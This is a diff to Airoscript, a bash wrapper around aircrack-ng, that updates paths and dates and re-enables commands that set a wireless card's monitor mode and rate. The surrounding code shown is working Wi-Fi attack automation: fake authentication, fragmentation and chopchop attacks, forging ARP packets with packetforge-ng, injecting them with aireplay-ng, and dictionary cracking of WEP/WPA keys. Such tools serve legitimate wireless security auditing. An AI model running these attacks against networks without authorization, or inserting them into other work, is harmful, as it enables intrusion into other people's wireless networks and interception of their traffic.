@@ -3,9 +3,9 @@
 # Program:	Airoscript                                                          
 # Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
 # Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes and darkAudax
-# Date:	        10.05.2007
+# Date:	        14.05.2007
 # Version:	SVN TESTING RELEASE FOR AIRCRACK-NG SVN 
-#		(needs SVN rev399 and up)
+#		(needs SVN rev 400 and up)
 # 
 # Dependencies: aircrack-ng,xterm,grep,awk,drivers capable of injection
 #
@@ -44,7 +44,7 @@ AIREPLAY="aireplay-ng"
 AIRCRACK="aircrack-ng"
 ARPFORGE="packetforge-ng"
 #The path where the data is stored (FOLDER MUST EXIST !)
-DUMP_PATH="/tmp/"
+DUMP_PATH="/tmp"
 # Path to your wordlist file (for WPA and WEP dictionnary attack)
 WORDLIST="/tmp/wordlist.txt"
 #The Mac address used to associate with AP during fakeauth			
@@ -94,7 +94,7 @@ IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
 }
 # this sets wifi interface if not hard coded in the script
 function setinterface {
-INTERFACES=`iwconfig | grep ESSID | awk '{ print $1 }'| grep -v lo | grep -v inet*`
+INTERFACES=`iwconfig | grep WLAN | awk '{ print $1 }'| grep -v lo | grep -v inet*`
 	clear
 	if [ $WIFI =  ]
 		then
@@ -364,7 +364,6 @@ while true; do
     7 ) fragmentationattack ; break ;;
     8 ) chopchopattackclient ; break ;;
 
-#   8 ) solointeractiveattack ; break ;;
     9 ) chopchopend ; break ;;
    10 ) chopchopclientend ; break ;;
    11 ) fragnoclientend ; break ;;
@@ -864,7 +863,7 @@ echo You typed: $channel_number
 set -- ${channel_number}
 	clear
 	rm -rf $DUMP_PATH/dump*
-#	$AIRMON start $WIFI $channel_number
+	$AIRMON start $WIFI $channel_number
 	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
 }
 function capture {
@@ -949,10 +948,11 @@ rm -rf fragment-*
 rm -rf $DUMP_PATH/frag_*
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
-#iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
+iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
 xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth &  menufonction
 }
 function fragnoclientend {
+iwconfig $WIFI rate 1M
 $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
 }
@@ -961,11 +961,12 @@ rm -rf fragment-*
 rm -rf $DUMP_PATH/frag_*
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
-#iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
+iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
 xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  menufonction
 }
 
 function fragmentationattackend {
+iwconfig $WIFI rate 1M
 $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
 }
@@ -1041,9 +1042,11 @@ select choix in $CHOICES; do
 	menu
 	fi					
 	elif [ "$choix" = "3" ]; then
-#	$AIRMON start $WIFI $Host_CHAN
-	iwconfig $WIFI rate $Host_SPEED"M"
-	echo "iwconfig $WIFI rate $Host_SPEED"M""
+	$AIRMON start $WIFI $Host_CHAN
+#	iwconfig $WIFI rate $Host_SPEED"M"
+	iwconfig $WIFI rate 1M
+#	echo "iwconfig $WIFI rate $Host_SPEED"M""
+	echo "iwconfig $WIFI rate 1"M""
 	witchattack	
 	clear
 	target
